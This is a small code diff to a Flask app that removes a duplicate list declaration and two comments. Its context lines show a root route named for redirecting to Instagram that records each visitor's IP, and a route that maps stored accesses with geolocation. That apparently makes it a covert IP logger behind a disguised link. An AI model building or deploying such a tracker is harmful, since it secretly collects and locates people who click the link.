@@ -4,8 +4,6 @@ import requests
 app = Flask(__name__)
 acessos = []
 
-acessos = []
-
 @app.route('/')
 def redirecionar_instagram():
     ip = request.headers.get('X-Forwarded-For', request.remote_addr)
@@ -33,8 +31,6 @@ def redirecionar_instagram():
 
 @app.route('/mapa')
 def mapa():
-    # Supondo que você tenha os IPs e geolocalização armazenados em uma lista ou banco
-    # Exemplo com dados reais
     return render_template('mapa.html', acessos=acessos)
 
 @app.route('/acessos')
